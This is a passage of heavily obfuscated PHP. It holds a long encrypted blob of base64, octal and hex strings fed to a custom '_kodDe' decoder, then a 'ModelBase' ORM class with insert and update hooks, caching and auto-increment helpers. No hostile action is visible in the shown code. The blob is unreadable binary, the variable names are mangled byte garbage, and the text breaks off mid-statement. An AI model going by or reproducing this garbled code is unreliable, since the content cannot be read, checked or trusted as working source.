úu'."\0".';úçˆëï;').base64_decode('acf4BZeVt0fyO1tjmcdPvWrPRa6cTNFWkSRoogDBfhcd4fuCXITi+//JKqLyzAYs2acRK70=').base64_decode('3YWxUt6LJVzeuGz00+XrqNaZH8uonPllfiEp9t2c+KQ+mBoU2UOaZMWcyD/pxsZUnyAOsxI=').base64_decode('LMpw6l1v4NyB6uQOTnL1F6uueBGLj9cYWri2IbkkkLM4XW65HXG5oUCKYIGpV3YCNopOaDg=')."\31\373\157\361\142\361\253\227\131\65\55\117\21\204\243\142\127\223\340\370\241\122\226\356\222\221\162\67\111\124\164\274\245\22\153\260\142\245\362\371\221\145\40\203\10\363\372\34\256\113\64\64\327"."\xfc\x86\xd1\xed\x19\x45\x1c\xbe\xb5\x72\xff\x1d\xab\x72\x29\xa5\x7e\x76\xc3\xdc\x5\xe8\x7f\x1a\x33\x83\x69\x18\x95\xa\xec\xf1\x0\xfa\x64\xfe\x3d\xa6\xfa\x7\x18\xad\x11\x2e\xb4\xd8\xd8\xf0\x84\x4b\xee\x66\x1c"."\321\2\214\334\233\7\43\122\216\174\242\267\16\7\160\60\120\52\373\221\374\343\220\273\37\112\242\260\336\235\312\375\10\125\240\326\6\363\21\45\371\340\344\363\220\146\37\105\176\304\327\304\312"."\xe8\xcf\xe\x8a\x1\x10\xb2\x2\x88\x3d\x88\xfa\x67\x8a\x83\x12\x61\x51\x25\x82\x90\xcc\x94\xf2\x83\x4d\x52\xa2\x62\x9b\xa6\x92\xd3\xf2\x63\x70\xfe\x9c\x6e\x35\x4c\xb7\x16\xe2\x86\x9a\xf0\xc3\x10\x6b\x3a\x73\x22"."\x85\x37\x26\x61\xc7\x94\x9a\xd2\x82\x14\x7a\xad\xe5\xc3\x2e\xe0\x7c\x78\xd7\x8b\x95\x20\x57\x17\xa1\xe9\xf4\x1b\x1c\x70\x41\x42\xa4\xbb\x2d\xdc\x29\xe9\x2\x4a\x11\x6a\xb0\xa5\x53\xd\x74\x75\x55\x4c\x0\xb0\x53"."\141\63\126\244\361\255\225\374\177\322\257\106\164\364\122\222\370\351\121\323\64\34\73\115\261\212\111\146\354\173\232\37\124\313\110\6\301\5\65\32\120\244\12\27\121\6\20\116\170\311\27\115\256"."\132\324\350\67\240\244\317\177\74\246\321\176\254\124\227\237\201\247\116\326\361\41\261\255\302\32\231\242\64\152\12\5\127\123\25\271\72\251\122\62\150\37\347\32\305\213\334\205\271\317\266\106\277"."\x26\x27\xe2\xd5\x12\x33\xd9\xf9\x90\x9f\xc9\x87\xb9\xdd\xce\x8a\xb7\x66\x1\xc9\x17\x0\xf1\xa1\x14\xd4\xf2\xcb\xcb\x8b\xe0\xca\x7d\x49\x39\x89\x39\xd7\xcc\x10\x59\x82\xeb\x6\xb6\xb1\xb0\xa8\x11\x5f\xf6\x30\xb5"."\75\77\11\64\372\13\213\344\331\46\357\303\312\33\363\23\121\222\137\310\56\124\352\6\265\362\25\45\277\231\253\200\107\130\305\6\41\77\323\155\320\222\203\30\21\305\26\1\335\200\204\56\54"."\211\240\11\16\57\51\266\244\25\125\302\317\44\311\75\117\121\170\227\133\277\236\126\204\75\0\155\334\130\36\7\172\326\356\244\100\301\160\107\141\204\163\307\141\211\220\210\103\173\235\263\31\212".base64_decode('7HImEcPy0F9RJtLZJgL0LO9I7GEaUiTU21Plm7lxo99g2ohME4qV9fHcNNzrc+ZHIwHQ84w=')."\x10\xe1\xce\x49\x91\x6a\x9\x60\xd1\x14\xff\x4c\xf1\xb4\x93\x6b\x1d\x2a\x58\x15\xb1\xa9\x69\x51\xf\x67\xaf\xfa\x58\x9a\x4a\x4\x29\xf2\xdc\x31\xf6\xd4\xa8\x9b\xcf\x90\x2\x9d\x1f\x13\x2b\xf8\x67\xb0\x53\x30\xe0"."\174\31\121\302\344\43\42\275\200\323\372\370\142\341\200\217\302\131\376\16\24\12\16\12\304\2\370\322\53\153\364\373\71\331\240\27\141\276\244\170\73\311\262\20\242\345\212\307\112\204\256\4\354"."\xde\x99\x44\xf\x23\xaa\x6a\x16\x39\x99\xe3\xf1\xa8\x2e\x1e\x9\x68\x8e\x49\x91\x44\x79\x78\x72\xa3\x95\x2c\x1a\x5\xdb\x41\x6\xa9\xcf\xeb\x69\xc4\x57\xdb\x5a\x6d\x58\xa3\x59\xa6\x29\x20\xae\x6b\x9a\x46\x5c\x6f"."\114\103\113\232\246\60\332\307\73\330\210\133\103\74\161\266\151\32\31\204\225\321\165\124\236\220\266\112\215\240\202\323\24\106\174\163\32\207\143\321\66\321\46\312\237\342\201\153\314\356\30\74\132".base64_decode('CnTC9ePxq+nvCcczTCJ+O7OIWSZPMgiZIxz5ABbD0kzgorMrFk1Eg8zNnVNeS+O4ZQaLvkI=')."\25\7\62\366\242\216\153\42\261\34\234\255\360\103\14\140\103\261\224\317\163\45\120\214\257\174\73\154\252\374\247\207\334\220\352\251\276\111\322\225\36\215\335\237\202\120\231\136\10\263\67\244\320"."\117\264\361\46\360\213\172\13\242\45\333\246\330\262\252\236\362\365\120\273\0\115\265\354\131\25\123\71\25\317\57\131\116\71\105\301\73\111\37\207\72\132\377\176\40\237\142\145\125\341\53\77\160"."\x44\x55\xe5\xa9\xaa\xf6\xcd\xac\xa9\x2a\x4f\xa1\xca\xbd\xce\x74\xac\x39\xa7\x2e\x89\xa3\x44\x70\xfb\x4\x1c\x1\x79\xb7\x18\x8c\x84\x43\x9d\x9\x35\xc\xcc\x40\x5d\xfd\x89\xbe\x5a\xf1\xa6\xd0\xb0\x84\xad\x60\xfa"."\35\224\255\35\140\250\372\34\303\252\0\32\172\347\222\340\252\251\172\336\41\202\245\40\315\232\314\162\113\175\155\155\255\267\266\16\375\317\336\132\60\333\231\15\314\244\216\224\245\266\266\201\374"."\x4f\x13\xc8\xbd\x7\xa0\xa0\x33\x5\x91\x44\x46\xcb\x21\xc3\x88\xae\x43\x87\x60\xef\x44\x47\xe4\x12\x63\x44\x7b\x82\xf8\xb5\xa8\x82\xbb\x6\xd3\x22\x54\x6b\x11\xf6\x11\xe3\xb2\x8c\xac\x3a\x9c\x88\x2a\xe4\xfe\x1f".strrev(')h>cr=SÂ‚o>ê¥â≤åñ;Ë #Ö∞5xjÎ≥∂iƒc|rNB'."\0".'∫B')."\214\356\173\131\202\127\366\175\3\205\50\321\23\367\207\216\256\241\62\116\13\266\70\6\61\105\111\76\146\34\41\211\152\61\307\53\131\345\305\101\371\232\220\44\363\267\275\44\224\345\26\111\160"."\260\223\327\104\135\54\251\132\77\277\24\256\264\42\63\346\210\52\370\24\34\134\302\103\4\244\370\310\311\120\62\45\275\277\306\160\145\373\223\224\235\53\263\11\115\40\140\340\210\231\215\101\303".base64_decode('aQZElYrKsF2IM7KRJJwlsYdn3FEv7neDgCKibwHufIrqPrP+KkBxaJCY5aeujYlgp2FK2YQ=').base64_decode('2+7JJvPmuO1waxWykDR77AIs/hWKfywmxCLo1V2Qm7SVKnAnucoE6L1ZWQGIL89Nrhcr5MY=')."\xf1\xae\xdc\xc4\x78\x6d\x90\xdb\xe8\x96\x2d\xda\x52\x99\x94\xa4\x60\x66\x81\x27\x12\xa1\xdd\xc3\xea\x18\x96\x4e\xa8\xbe\x42\xd1\x4c\x23\x4c\xb0\x64\xa0\xa1\xf8\xae\xca\xd1\x3c\x7b\x79\xce\xa\x99\x78\xef\xe5\x7c"."\162\44\276\310\144\76\323\1\265\204\211\3\55\305\67\117\51\153\134\330\52\27\221\316\25\56\45\4\271\217\70\71\22\37\175\145\175\56\162\352\160\326\201\317\324\316\30\336\263\57\101\72\46"."\x2\xb1\x8b\x5a\xde\x1a\x90\x15\x54\x58\x36\x41\xa5\xb0\x78\x4a\xf6\xe0\xa9\x3a\xd0\x84\xe1\x2a\x53\x1f\xc3\x10\x12\x8a\x1a\xce\x78\x1a\x47\x85\x14\x8e\xdb\xe1\x4\x21\x7e\x59\x3d\x1\xdd\xa1\xb1\x74\x51\xe1\xa".base64_decode('Iszlc9xhAB7QFJZuU5NczJn25pkXsI8LWS4MVu41Vb6HwyBVZfkRXtHt3IV8BUR0IlsZVpE=')."\x7d\x1d\x57\xd0\xc0\xc9\x92\x14\xc2\xb5\xb3\x2b\x50\x74\xe8\xb6\xa8\x34\xd4\x83\xa3\x15\xea\x8a\x5c\xc1\xe\xd6\xa7\x3a\xe7\xa7\xbc\x0\x78\x6a\x33\x11\x77\x89\xed\x63\xcb\x85\x70\x5d\xdd\x2e\x12\xb5\x94\x53\x49".base64_decode('HOJ9pawdU31VpvvqQS13OvPRQmm0UL7wOwT+PoRSmNdiGz8aax86H23g2w7MUg8l26whPA4=')."\xf8\x4a\xb1\x49\x53\x9c\xdb\xb0\xb4\xa9\x28\x72\x45\x68\x7b\x4e\x64\xb0\x60\xa8\x4f\x21\x7d\x5f\x48\xdc\x7e\x54\x48\xc5\x96\x3d\x58\x6b\xdc\x80\x38\x6c\x7\x28\x8f\x69\xf3\x33\x35\xae\x3e\xc0\x9c\x81\xe3\x40\x44"."\146\212\23\264\210\167\221\350\252\103\335\100\162\136\300\263\242\156\260\316\153\254\157\104\277\224\70\211\220\216\371\256\240\133\33\27\227\220\330\40\24\224\266\150\302\40\330\154\217\147\56\42\204"."\x16\x2b\xf9\x14\x54\xf9\xcd\xcb\xce\x64\x1f\x67\x8\xe4\x8a\x4b\xca\x8f\x15\xfa\x7\xb5\xf2\x3a\x71\xf\xf2\x42\x89\x16\x38\x9d\xa2\x9e\x34\x8b\x29\xbc\x4b\x4a\xb6\x74\xf2\x76\x4c\x4f\xcb\x41\xa2\xd9\xc0\x96\x88"."\60\57\57\127\201\315\226\111\264\10\57\315\100\322\56\311\106\320\44\17\24\50\44\71\51\221\270\127\157\235\302\331\136\225\326\114\3\263\244\4\222\277\22\7\354\22\357\112\17\343\210\364\53"."\136\352\347\27\325\56\136\224\275\265\123\144\126\217\75\236\303\25\20\373\123\170\4\226\234\206\252\305\226\337\305\310\344\42\244\315\262\42\64\15\163\133\342\225\235\234\142\141\137\43\335\154\26".strrev(' ÈLy‰4ÚÅ∂åƒœÄhJm>——;Â˘U-ô{’÷ˆˇS:c	Ä#†ˆrMI$ähT•+')."\x9f\x58\x7c\x12\x6\x6c\x88\x11\x2b\x3e\x9f\xc4\xda\x15\xf\x15\x25\x6\x43\xe7\x8a\xd5\xc4\x1c\x94\x4c\xeb\x85\x36\x13\xd5\xb7\xc6\x19\xba\x2b\xa5\x53\x8\xe1\xe4\x16\x87\x86\xbc\x2b\x3\x5a\x1f\xce\x74\x70\x26"."\42\72\103\55\122\231\16\215\105\127\45\340\364\106\166\227\102\112\211\161\210\147\4\50\312\244\56\113\44\300\10\255\54\152\50\213\275\223\340\104\116\104\47\114\36\131\256\331\205\261\22\252\244".strrev('~]Ì]˜é¿6≥:#\\ÒGöQ‘KT9i»ÂK'."\0".'‰∑ã◊7;ƒö÷9!¸cîD8MÉ]\\ò‡'."\n".'&')."\325\314\227\47\225\256\10\73\174\101\246\212\251\217\352\160\22\34\311\31\111\45\22\155\13\7\3\221\226\160\174\251\222\306\327\264\102\103\21\165\127\45\313\126\265\204\377\36\342\302\310\271\300".strrev('hB≥π'."\n".'˜R¡ïñÃ?cVXΩJ≈-Y–t·2°»øK2á‚õ¬·—˚zÓ~ı√Nö|â')."\54\145\56\24\365\362\374\143\72\326\224\224\172\54\25\50\125\350\15\344\257\334\2\161\150\44\347\106\74\223\236\237\254\363\106\176\330\260\14\101\16\130\211\61\271\366\100\113\107\270\123\15\104".base64_decode('ItEVDk1jcd9Q5NKXlOyPSpoZMQm09XIjkGByT3bY4ZLI0OmTbYwW2NUYuMrlTmZoUPIXVyg=')."\152\206\245\113\21\324\265\131\35\274\276\323\262\131\207\333\327\354\200\24\54\71\367\333\212\115\251\264\1\26\107\270\337\311\63\304\302\155\355\211\377\165\127\215\224\260\23\150\244\230\216\32\177"."\x69\x4d\xfd\xcf\x4\x65\x67\xc1\xac\x4d\xe1\xe5\xa8\x3c\xe6\x7f\xeb\x6f\xcf\x23\xae\x17\x55\x62\x4c\x8d\x79\xf4\x34\xc9\x59\xa\x18\x7d\x1a\x17\x8e\xaa\x44\x92\xae\x8a\x26\x10\x17\x53\x1c\x2b\xc8\xd7\xba\xfe\x14"."\324\200\355\244\206\330\123\43\34\20\207\31\234\13\52\301\255\320\43\56\72\271\143\51\44\73\366\60\211\36\42\43\0\160\207\136\246\313\141\240\133\341\336\341\16\260\254\15\342\142\206\246\365"."\340\121\240\234\175\142\114\50\304\135\112\211\242\356\224\12\35\100\311\212\220\215\361\14\112\223\122\113\175\127\162\167\101\112\43\263\47\41\32\40\126\15\103\271\202\355\70\376\267\313\217\157\244"."\51\241\21\130\120\124\344\122\77\72\347\54\210\47\226\135\100\233\252\274\167\22\72\54\16\205\130\145\323\314\215\225\105\70\304\150\21\66\32\256\74\215\135\54\345\7\114\31\352\204\236\343\367".base64_decode('V9QlLZVOeNB5RLfLfdzR4v9/CtLEuGT01llJeYcs9/4peDnsvi9jjjj91OIYt8M+h6s+aYU=').base64_decode('EesIsnNBZyFPmasrhTgbVxAxgrnHij/s9EsyS01Ppz+98Mt2Q3cnKJ2DJms4KgYzRjZV5Co=').base64_decode('XSKiQxciCVIKEZaCxpyqE1eeMFzuXauSF0dsy9TpJEz4XhNbr9MXFdcjsMQSsmyH97OEmdA=')."\xd2\x1e\x8a\xaa\x98\x28\x8a\x50\xf3\x98\xfc\x2d\x2b\xf4\x93\x51\xa0\x44\x26\x36\x4c\xf1\xf9\x5e\x24\x65\x60\xbe\x50\x53\x1e\xe2\xa8\x93\xd2\x45\xb7\xfb\x2e\x69\x7d\x72\xf2\x2b\x97\x4e\x13\x23\x9e\xa0\x6f\xe8\x78"."\255\127\104\107\64\235\155\41\216\154\64\312\257\25\12\342\22\105\336\161\321\277\216\207\330\220\326\235\150\127\211\151\22\225\52\106\304\5\316\111\27\233\64\22\56\71\113\371\60\275\314\161\304"."\26\245\303\243\154\56\232\136\360\210\367\274\220\35\365\263\213\336\350\2\300\344\52\331\55\73\27\310\43\172\304\317\330\376\362\133\171\254\252\6\24\5\253\6\61\235\254\101\223\234\321\174\362".base64_decode('6Q4yKI3MqAziOb0CSxxrGmMV4rapV1RCNGTiVjmW8OGEznqBTLBHrnTXwwYcmKnYLD+Ncec=')._kodDe('MT+ZnH2U9SaYYac8tSt4fK0lR4UZxviAK/I9qF8aQPpkybifrfSiTSslGIpjHME0meqpH+v8').base64_decode('duKlcQHNpdPJL2dN+Gmm7EDkPgvxyXAViLknLGGWi7KF4oPDa600ahpRwfOtBAZp3KVi1kM=').strrev('r´0ÌóHÌH~x∏;Gå≥ªñ]ëcCf…9Lrì¬ï˚øpVÑ˜=?á\\Û¢≤ÌL<@t').base64_decode('qfrZcxfIIhcxheIKmXkzoD/AJAmkUBxg8CjMeLVMPkii8w1Puadm1xbyv1sw4vRCs0qqweU=').strrev('¥9®ªk·œÚ|YöÓ}B≈•fàqÖG¸¢€;3¸*ËÍ±,Äâë∂óTvìY“T@ ÀÏŒ')."\x95\xce\x6d\x4\x12\xec\x90\x88\x25\xc5\x22\xe4\x54\xdf\x2\x19\x8f\x48\x96\xe\x76\x72\x8d\xb6\xe9\x16\x50\xe1\xe2\x78\x63\x25\xc2\xd6\x68\x3e\xb\xfb\x3e\x36\x8c\x21\x56\x9b\x44\x89\xfe\x17\x13\xc8\xce\x68\xf4"."\x38\x27\xf4\xd6\xf0\xf0\x1d\x47\x7b\x27\x14\xfc\x27\x31\x32\x53\xc1\xaf\xb2\xa4\xa6\xf3\x25\x63\xa0\xac\x22\x3f\x9b\x7a\x35\xdb\x2b\x21\xa7\x24\xe0\xd4\xed\x28\x99\x6c\x20\x17\xe2\x8\xed\x1c\xb7\xab\x7a\x54\x4c"."\324\321\347\121\46\313\124\316\57\112\356\227\205\111\106\211\123\304\245\331\263\366\111\44\20\344\125\265\223\347\222\135\274\222\47\311\302\242\20\131\272\216\145\54\331\212\227\237\364\222\212\344\365"."\121\136\265\344\60\127\310\255\210\240\13\106\4\213\233\350\155\220\156\6\332\370\203\160\115\122\102\164\12\323\200\73\224\34\305\43\360\111\276\324\115\371\133\162\304\214\366\204\50\173\261\201\272".base64_decode('4zgHo7CwkC7Rr5QrksGMEA3hNZywzjOBaZbNDjhOXtyjqOMkZrndCiPO0uHxJFXmxB3IKHk=')."\275\107\133\223\66\142\326\305\264\364\325\131\312\211\200\44\240\46\307\67\236\350\260\316\200\315\20\272\50\6\263\371\140\271\34\225\123\173\347\364\233\235\62\376\217\75\352\376\337\162\244\73\267".base64_decode('ll0l4Pr5G8M24PWht/gSl4tOqBjbNQ7nZnsg4BQCvm9YkBgS5lrszBQls1CpsTs+LZuVtuQ=')."\xca\xa7\xa3\x32\x4f\xe9\x8\x15\x7\xb9\x6b\xec\x4a\x1\xf7\xdb\x64\xb7\xd7\xf4\x1e\x22\x45\x66\x6e\xcf\xfb\x4\x55\xc1\x71\x95\x8a\xc9\xbe\x96\x5d\x7e\xd6\x49\x5d\x28\x46\xaa\x85\x2b\x3a\x42\x66\x76\x4e\x62\xa7"."\271\12\13\202\106\61\46\136\220\272\274\221\34\254\160\323\117\124\176\235\216\16\44\236\247\54\233\350\76\142\215\270\326\61\373\112\342\143\54\61\211\3\323\40\233\55\210\26\330\201\267\6\66"."\x97\x3e\xf8\x5\x53\x29\x40\xb\x65\xfa\xe7\x88\x2a\xa3\x9a\x9\xc7\xe4\x3a\x22\xe5\x79\x13\xa4\xcd\xc7\xf0\xc2\x51\xa2\xc3\xe5\xa\x9a\x66\x62\xb6\x90\x41\x91\x43\x22\xd3\xe5\x8a\x1f\xe5\xa5\x39\x41\x91\x8b\xe0"."\x57\x8\x4e\x91\x1d\x9e\x56\x72\xda\xa9\xf5\xba\x22\xea\xbc\xae\xea\xb8\x37\x6c\xe7\xa2\x71\xb8\x67\xa6\xca\x32\x68\xa5\xc5\xb0\x68\x86\x89\xe8\xc8\x55\x18\xb9\x28\xf7\x96\x97\xa1\xb\x24\x2e\xf2\x4c\xb2\x44\x2b"."\23\12\336\51\41\246\304\137\62\74\30\301\351\52\232\204\377\164\306\162\161\225\244\374\235\224\144\301\156\226\222\106\117\367\311\3\221\57\213\235\67\116\130\373\120\134\301\46\242\261\220\272\42".base64_decode('jE1shE8OdTMT0YZJfKywKrs7qskTPFgA6HDUagpU0hFVtMX6FHaO7VwhyC+MnY+4pXcfzL4=')."\x98\x2c\x2a\x75\x66\xc6\x6f\x76\x9c\x6b\x71\x51\xa5\x6c\x49\xb3\x68\xc9\x46\x42\x1d\x89\x98\x9b\x33\x51\x6a\x8c\x9d\xef\xbb\xf3\x68\x21\xeb\x49\x5b\x4f\x29\x98\x2f\x70\x1c\x15\x7a\xe6\xd4\xce\xee\xfb\xb2\x5a\x50"."\x3a\xcf\x39\xe7\x2b\x72\xce\x1\x20\xce\xf6\x32\x45\x65\x96\xa7\x62\x39\x93\xda\x3\xaa\x94\x86\x70\x33\x6e\x3b\x90\x48\x38\xe8\x71\x3b\xe6\x69\x75\xd8\xda\x6a\x90\x44\xb7\xa\xb1\x3a\x6\x1e\x9a\x26\x99\x9b\x4e".base64_decode('Myg4FlcaJg2Tp+JDL78VZ05bsOKfHxslww9T/AT/QOK+Ss2psFmpWNQgJE6E4pYfNaEluzg=')."\26\55\306\162\235\145\306\372\234\157\314\244\362\104\16\105\105\113\16\11\23\350\71\310\121\322\275\77\72\345\245\234\256\320\110\42\211\146\326\312\241\6\351\346\332\251\70\300\237\357\226\155\265"."\45\43\42\45\223\122\314\352\55\372\305\126\10\302\302\150\24\111\246\267\157\201\141\215\333\145\163\227\352\166\234\240\45\65\203\44\241\41\241\362\233\144\161\301\55\261\255\254\30\76\202\13\36"."\302\25\57\321\134\261\53\152\303\202\11\27\207\300\124\252\125\33\256\220\65\245\273\355\352\241\30\236\225\60\361\222\371\20\361\214\110\37\221\133\207\174\342\331\216\43\143\171\254\60\57\42\225"."\27\267\207\142\230\70\256\322\360\11\15\164\26\227\315\227\160\244\22\121\324\251\25\327\311\221\16\334\130\151\111\50\353\320\241\160\271\222\150\322\151\54\205\147\343\163\206\362\220\7\205\136\107"."\254\113\204\200\105\170\214\345\164\45\201\120\113\252\276\242\354\113\102\1\75\33\221\252\223\65\13\46\55\20\257\334\210\300\112\47\210\45\53\63\42\201\61\65\162\55\216\135\215\17\14\162\306"."\344\104\107\167\334\123\113\116\274\2\175\151\144\216\134\100\320\264\200\63\211\346\327\135\275\227\13\270\107\106\113\70\274\40\312\361\43\206\235\314\110\307\363\362\304\362\370\142\31\260\241\3\225"."\307\341\356\55\203\265\133\150\41\52\51\353\217\244\266\224\60\53\224\241\75\252\130\214\46\341\222\342\34\344\50\73\11\10\160\131\232\204\313\226\45\263\302\145\160\45\345\154\255\144\115\62\274".base64_decode('cuCBECxVYcBCVCRlnQyeFTOXNweY6M5NpGaVeyGEXS5FkUq9qJh50l64cwuuBB92K6U4tK0=').strrev('0 ºW)ÖNX ëV+/YUu¨≤B≤¿lë¸ƒõE(†´HÜ[ÂI™√U&ÖJjP*RÕ∫%J;ú').base64_decode('v04DTLESMWlZY1AopLKHKyDg4Nqdg3mTb08poYSMeatA0Q3nstqcqJ8vSSbvK76j8WCJVLk=').base64_decode('tCer8ceNQmePnqpN20jqTrv6sh1Lms4ayUryb5foWcjHHKo7FQSyJIp++sQtEK1PjEXCCcc=')."\x93\x37\xca\x92\xc0\x95\x1b\xbd\xb8\xf\xe2\x7b\x35\x7e\x65\x4b\x4c\xbe\xd3\x2d\x9c\x26\xc7\xcd\xa2\xed\xc1\x69\x9\xb3\x40\x7e\x9b\x4d\xdb\x16\x7a\x30\x54\x4\x45\x18\x71\xbc\xf\x7b\x24\x35\x2f\xf4\x25\xee\x67".base64_decode('cafIbR9BW0KxyCeoEGDZTlynqYTOOQL4FpEH5G0W7ghbSy5lBxExaKb6zVFmPBLhlQQkcWM=')."\250\271\171\313\141\367\263\153\131\151\215\130\126\261\374\64\305\17\116\234\274\244\16\360\343\352\133\133\110\73\212\123\317\230\134\17\375\313\152\200\133\3\121\5\365\340\102\104\270\360\44\57\236"._kodDe('KYx9ahrX+grmTcZqAEftQYs+P3afPlriUsPGx74SN2V2IZlgAmsGt58eAf9ChmyHU+hQb74G')."\16\56\25\75\51\267\376\312\56\351\42\340\352\123\314\213\164\151\125\310\230\354\56\212\345\217\153\131\300\75\371\122\103\317\11\73\265\242\214\123\12\46\317\277\305\14\112\363\17\247\227\105\227".base64_decode('Ui9DbKgI6wR2Qt2xAsRiRzmcPnA+X37OLJRUfA5lFimerCdCoCQ8lfd+cqXJRWMkeWZF0Mk=').base64_decode('1x/lV3MkVYAGd3mJCQqoa81+6eqNnr/gsT0AW9IIpd+OZFtLV9TwoHJsTD+EhPn/A9j0EuY=')."\2\273\0\0"."".base64_decode('')."".""."", 10, -8))); goto cöÙÜ»âµñ; D»øÕ∆äÍŒ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\151\146\171\x54\151\155\x65", "\x74\151\155\x65", "\x69\156\163\145\x72\x74\x2c\165\x70\x64\141\164\x65", "\146\165\156\x63\x74\x69\x6f\156"), array("\143\x72\x65\141\x74\x65\x54\151\x6d\145", "\x74\x69\155\145", "\x69\156\x73\x65\162\x74", "\146\165\x6e\143\x74\151\157\x6e")); public function setDataAuto($„™®˝Ôó) { $this->dataAuto = $„™®˝Ôó; } public function __construct($∂øœ»ù¶ = '', $ıÖﬁˆÿ = '', $ßŸùØƒó = '') { parent::__construct($∂øœ»ù¶, $ıÖﬁˆÿ, $ßŸùØƒó); } protected $tableMeta = array(); protected function _beforeInsert(&$∆±¶ÕÎ¥, $‹‘À¢Üô) { $Ú∑‡Ó¿æ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->checkDataAutoHas($Ú∑‡Ó¿æ[441])) { return; } $this->dataBeforeFilter($∆±¶ÕÎ¥, $Ú∑‡Ó¿æ[441]); } protected function _beforeUpdate(&$öà≠Ç¢ç, $¸ÚµèÂÜ) { $≥©åìá´ =& $_SERVER[ˆë€Ï⁄∂]; if (!$this->checkDataAutoHas($≥©åìá´[442])) { return; } $this->dataBeforeFilter($öà≠Ç¢ç, $≥©åìá´[442]); } protected function _afterSelect(&$ê√é¯…˙, $»ÌÅã≠“) { if (!is_array($ê√é¯…˙)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆë€Ï⁄∂][443])) { return; } foreach ($ê√é¯…˙ as &$øÇÌØ‡ ) { $this->dataAfterFilter($øÇÌØ‡ ); } unset($øÇÌØ‡ ); } protected function _afterFind(&$èÁÆÏÃ√, $¯ı∂±∏Ë) { if (!is_array($èÁÆÏÃ√)) { return; } if (!$this->checkDataAutoHas($_SERVER[ˆë€Ï⁄∂][443])) { return; } $this->dataAfterFilter($èÁÆÏÃ√); } public static function textEncode($Ù·‹ÃΩÃ) { if (!$Ù·‹ÃΩÃ) { return $Ù·‹ÃΩÃ; } $›êòæëË = json_encode($Ù·‹ÃΩÃ); $›êòæëË = preg_replace_callback($_SERVER[ˆë€Ï⁄∂][444], function ($¬èÂ·µô) { return addslashes($¬èÂ·µô[0]); }, $›êòæëË); return json_decode($›êòæëË); } public static function textDecode($…⁄¸÷¬¥) { $¬˜¡ßâ• =& $_SERVER[ˆë€Ï⁄∂]; $—Åõ˝·∂ = json_encode($…⁄¸÷¬¥); $—Åõ˝·∂ = preg_replace_callback($¬˜¡ßâ•[445], function ($⁄∆Ï¡¨’) { return $_SERVER[ˆë€Ï⁄∂][110]; }, $—Åõ˝·∂); return json_decode($—Åõ˝·∂); } public function setAutoIncrement($ ›§â›Ò) { $ÁöŒÚ†∆ = array($this->getPk() => $ ›§â›Ò); $††Ï“≤ = $this->data($ÁöŒÚ†∆)->add(); if ($††Ï“≤) { $this->delete($††Ï“≤); } } public function getAutoIncrement() { $Ç¯çäÄ≤ = $this->getTableName(); $Ü—ä˝œÕ = $this->max($this->getPk()); $Ãë”¯Æë = $this->query("\163\x68\157\x77\40\164\141\142\x6c\145\x20\x73\164\x61\164\165\163\40\x77\150\x65\162\145\40\116\141\155\x65\x3d\47{$Ç¯çäÄ≤}\47"); $‹Çñ≥ºƒ = $Ãë”¯Æë[0][$_SERVER[ˆë€Ï⁄∂][446]]; $“⁄ﬁ¯Ô˚ = max($Ü—ä˝œÕ, $‹Çñ≥ºƒ); return $“⁄ﬁ¯Ô˚; } protected function _callBefore($†Ë‹’√Ô, $áã¡Èºﬂ) { return $this->cacheCallCheck($†Ë‹’√Ô, $áã¡Èºﬂ, !1); } protected function _callAfter($Ù∆È≤å™, $ÔÕÂΩ‹è) { return $this->cacheCallCheck($Ù∆È≤å™, $ÔÕÂΩ‹è, !0); } protected function cacheFunctionAlias($éÊœ·®Ö) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($⁄¨›ÃÌ´, $å≠–âﬁ™, $‘˙‰˘˜µ = false) { $…ü ¶¬¯ =& $_SERVER[ˆë€Ï⁄∂]; $∆‹˛¬˝π = $this->cacheFunctionAlias($å≠–âﬁ™); if (!$∆‹˛¬˝π) { return; } foreach ($∆‹˛¬˝π as $ß‹†ûÍë => $–£áŸﬂ) { $∏Í“√ò‡ = $–£áŸﬂ[0]; $”ÈÉîœÁ = explode($…ü ¶¬¯[50], $–£áŸﬂ[1]); $ÏºëÃÿë = isset($–£áŸﬂ[2]) ? $–£áŸﬂ[2] : $…ü ¶¬¯[12]; if ($⁄¨›ÃÌ´ == $ß‹†ûÍë) { return $this->cacheFunctionGet($ß‹†ûÍë, $∏Í“√ò‡, $ÏºëÃÿë); } if ($‘˙‰˘˜µ && in_array($⁄¨›ÃÌ´, $”ÈÉîœÁ)) { $this->cacheFunctionClear($ß‹†ûÍë, $∏Í“√ò‡, $ÏºëÃÿë); } } } public function cacheFunctionGet($≈ñ∏–π“, $˜∆ˆâ˛ë, $¡–∑ä∑Î = '') { $±É√Âµ¯ = $this->cacheKeyMake($≈ñ∏–π“, $˜∆ˆâ˛ë, $¡–∑ä∑Î); $Óæ›õ≤ﬁ = Cache::get($±É√Âµ¯); if (!is_array($Óæ›õ≤ﬁ)) { $Óæ›õ≤ﬁ = call_user_func_array(array($this, $≈ñ∏–π“), array($˜∆ˆâ˛ë, !0)); Cache::set($±É√Âµ¯, $Óæ›õ≤ﬁ); } return $Óæ›õ≤ﬁ; } public function cacheFunctionClear($™ÍÓ¸Êú, $Áº¸˘Ÿ⁄, $»ÎªÄÅ = '') { $ÉÕúÃÚË = $Áº¸˘Ÿ⁄; if (!is_array($Áº¸˘Ÿ⁄)) { $ÉÕúÃÚË = array($Áº¸˘Ÿ⁄); } foreach ($ÉÕúÃÚË as $Üï´¢†ﬁ) { $”Ò¢üÔﬂ = $this->cacheKeyMake($™ÍÓ¸Êú, $Üï´¢†ﬁ, $»ÎªÄÅ); Cache::remove($”Ò¢üÔﬂ); } } public function cacheKeyMake($ñﬂÿ¸ÕÏ, $êˆÍ˚˝µ, $À©§Œ›Ó) { $¢ËñÈÄñ =& $_SERVER[ˆë€Ï⁄∂]; if ($À©§Œ›Ó) { $êˆÍ˚˝µ = $êˆÍ˚˝µ . $¢ËñÈÄñ[447] . $À©§Œ›Ó; } return get_class($this) . $¢ËñÈÄñ[11] . $ñﬂÿ¸ÕÏ . $¢ËñÈÄñ[448] . $êˆÍ˚˝µ; } protected function selectPageReset() { $ËáΩÜ¨à =& $_SERVER[ˆë€Ï⁄∂]; if (isset($GLOBALS[$ËáΩÜ¨à[449]])) { return; } $GLOBALS[$ËáΩÜ¨à[449]] = isset($GLOBALS[$ËáΩÜ¨à[7]][$ËáΩÜ¨à[450]]) ? 